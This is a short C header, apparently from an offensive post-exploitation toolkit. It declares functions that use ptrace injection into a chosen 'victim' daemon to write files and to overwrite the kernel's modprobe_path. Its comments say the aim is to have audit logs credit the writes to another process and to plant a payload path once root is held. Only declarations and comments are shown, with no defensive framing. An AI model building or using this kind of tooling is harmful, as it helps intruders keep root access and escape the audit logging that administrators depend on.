#ifndef STEALTH_H
#define STEALTH_H

#include <stdint.h>

/*
 * Write to a file path via ptrace injection into a victim process.
 * The open/write/close syscalls are attributed to the victim PID
 * in audit logs, not the calling process.
 *
 * Requires: already root (post-exploitation), victim must be
 * ptraceable (same uid or CAP_SYS_PTRACE).
 *
 * Returns 0 on success, -1 on failure.
 */
int stealth_write_file(const char *path, const char *data, int len);

/*
 * Overwrite modprobe_path via injection.
 * Equivalent to: echo -n "$payload_path" > /proc/sys/kernel/modprobe
 * but attributed to another process.
 */
int stealth_write_modprobe(const char *payload_path);

/*
 * Find a suitable victim process for injection.
 * Prefers long-lived daemons that normally do file I/O.
 * Returns PID or -1.
 */
int stealth_find_victim(void);

#endif
